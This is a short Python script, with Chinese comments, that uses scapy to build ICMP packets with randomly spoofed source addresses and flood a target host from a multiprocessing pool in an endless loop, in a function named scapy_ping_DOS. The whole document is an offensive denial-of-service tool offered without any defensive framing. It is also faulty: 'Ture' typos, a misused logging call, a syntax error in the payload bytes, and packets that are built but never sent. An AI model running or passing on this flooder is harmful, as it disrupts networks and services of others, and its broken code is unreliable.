import logging #報錯提醒
logging.getLogger("scapy.runtime").setLevel(logging.error())

import multiprocessing #開進程
from random import randint
from scapy.all import *
from scapy_IP import Random_IP

def scapy_ping_sendone(host,random_source=Ture):
    id_ip=randint(1,65535)
    id_ping=randint(1,65535)
    seq_ping=randint(1,65535)

    if random_source == True:
        scour_ip=Random_IP()
        packet=IP(src=scour_ip,dst=host,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b 'welcome'
    else:
        packet=IP(dst=host,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b 'welcome'

def scapy_ping_10K(host,random_source=Ture):
    for i in range(10000+1):
        if random_source == True:
            scapy_ping_sendone(host)
        else:
            scapy_ping_sendone(host,random_source=False)

def scapy_ping_DOS(host,processes=5,random_source=Ture):
    pool=multiprocessing.Pool(processes=processes)
    while True:
        try:
            pool.apply_async(scapy_ping_10K,(host,random_source))
        except KeyboardInterrupt:
            pool.terminate()
if __name__=='__main__':
    scapy_ping_DOS('IP',10)